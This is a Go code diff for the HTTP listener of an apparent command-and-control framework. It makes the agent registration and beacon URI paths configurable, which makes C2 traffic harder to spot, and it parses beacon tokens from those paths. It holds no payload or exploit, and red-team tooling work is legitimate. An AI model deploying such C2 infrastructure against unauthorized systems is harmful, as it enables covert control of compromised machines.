@@ -43,8 +43,10 @@ import (
 // ── HTTP listener registry ────────────────────────────────────────────────────
 
 type httpListenerEntry struct {
-	addr   string
-	server *http.Server
+	addr         string
+	server       *http.Server
+	registerPath string // e.g. "/register"
+	beaconPath   string // e.g. "/beacon/" (trailing slash for prefix match)
 }
 
 type httpListenerRegistry struct {
@@ -87,11 +89,23 @@ func (r *httpListenerRegistry) all() []string {
 // ── Start / Stop ──────────────────────────────────────────────────────────────
 
 // StartHTTPListener starts an HTTP C2 listener on addr and registers it.
-// Agents reach it at POST /register and GET|POST /beacon/{token}.
-func (c *Console) StartHTTPListener(addr string) error {
+// registerPath and beaconPath are the URI prefixes agents use (e.g. "/register"
+// and "/beacon/").  Pass empty strings to use the defaults.
+func (c *Console) StartHTTPListener(addr, registerPath, beaconPath string) error {
+	if registerPath == "" {
+		registerPath = "/register"
+	}
+	if beaconPath == "" {
+		beaconPath = "/beacon/"
+	}
+	// Ensure beacon path ends with "/" so net/http prefix-matches token sub-paths.
+	if len(beaconPath) > 0 && beaconPath[len(beaconPath)-1] != '/' {
+		beaconPath += "/"
+	}
+
 	mux := http.NewServeMux()
-	mux.HandleFunc("/register", c.handleHTTPRegister)
-	mux.HandleFunc("/beacon/", c.handleHTTPBeacon)
+	mux.HandleFunc(registerPath, c.handleHTTPRegister)
+	mux.HandleFunc(beaconPath, c.handleHTTPBeacon)
 
 	srv := &http.Server{
 		Addr:         addr,
@@ -99,7 +113,12 @@ func (c *Console) StartHTTPListener(addr string) error {
 		ReadTimeout:  30 * time.Second,
 		WriteTimeout: 30 * time.Second,
 	}
-	entry := &httpListenerEntry{addr: addr, server: srv}
+	entry := &httpListenerEntry{
+		addr:         addr,
+		server:       srv,
+		registerPath: registerPath,
+		beaconPath:   beaconPath,
+	}
 	if !c.httpListeners.add(addr, entry) {
 		return fmt.Errorf("already listening on %s", addr)
 	}
@@ -218,7 +237,19 @@ func (c *Console) handleHTTPRegister(w http.ResponseWriter, r *http.Request) {
 // handleHTTPBeacon dispatches GET (task poll) and POST (result submit) for
 // /beacon/{token}.
 func (c *Console) handleHTTPBeacon(w http.ResponseWriter, r *http.Request) {
-	token := strings.TrimPrefix(r.URL.Path, "/beacon/")
+	// Strip whichever beacon path prefix this listener was configured with.
+	// Fall back to stripping "/beacon/" for handlers registered on the default path.
+	token := r.URL.Path
+	// Walk the registered listeners to find the matching beacon path.
+	c.httpListeners.mu.Lock()
+	for _, e := range c.httpListeners.listeners {
+		if strings.HasPrefix(token, e.beaconPath) {
+			token = strings.TrimPrefix(token, e.beaconPath)
+			break
+		}
+	}
+	c.httpListeners.mu.Unlock()
+	token = strings.TrimPrefix(token, "/beacon/") // fallback for tests
 	if token == "" {
 		http.Error(w, "missing token", http.StatusBadRequest)
 		return
